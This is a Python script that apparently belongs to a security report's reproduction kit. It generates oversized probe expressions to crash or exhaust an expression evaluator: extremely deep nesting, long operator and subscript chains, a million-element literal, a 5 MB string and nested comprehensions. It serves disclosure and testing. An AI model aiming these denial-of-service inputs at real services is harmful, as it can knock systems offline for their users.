#!/usr/bin/env python3
"""Regenerate the oversized probe expressions that are not stored verbatim in repro/cases/.

Usage: python3 make_big_cases.py <outdir>
Writes the eight cases >2 KB (deep nesting, parser-stack exhaustion, million-node literal,
5 MB constant) so every attack in the report is reproducible without storing 8 MB of probes.
"""
import os
import sys

out = sys.argv[1] if len(sys.argv) > 1 else "."
os.makedirs(out, exist_ok=True)
T = "c['show']['model_info']['tokenizer.ggml.tokens']"
cases = {
    "40-nest-paren-20k": "(" * 20000 + "1" + ")" * 20000,
    "41-nest-paren-100k": "(" * 100000 + "1" + ")" * 100000,
    "42-not-chain-100k": "not " * 100000 + "1",
    "43-sub-chain-20k": "c" + "['tags']" * 20000,
    "44-sub-chain-100k": "c" + "['tags']" * 100000,
    "45-huge-listlit-1e6": "[" + ",".join(["0"] * 10 ** 6) + "]",
    "46-many-chains-2000": " or ".join(["c['tags']"] * 2000),
    "51-nest-listlit-100k": "[" * 100000 + "]" * 100000,
    "56-huge-const-str": '"' + "A" * 5_000_000 + '" in c[\'version\'][\'version\']',
    "57-comp5-512tok": (
        "[[[[[t for t in %s] for _ in %s] for _ in %s] for _ in %s] for _ in %s]" % ((T,) * 5)
    ),
}
for name, body in cases.items():
    path = os.path.join(out, name + ".expr")
    with open(path, "w", encoding="utf-8") as fh:
        fh.write(body)
    print(f"{name}.expr {len(body)} bytes")
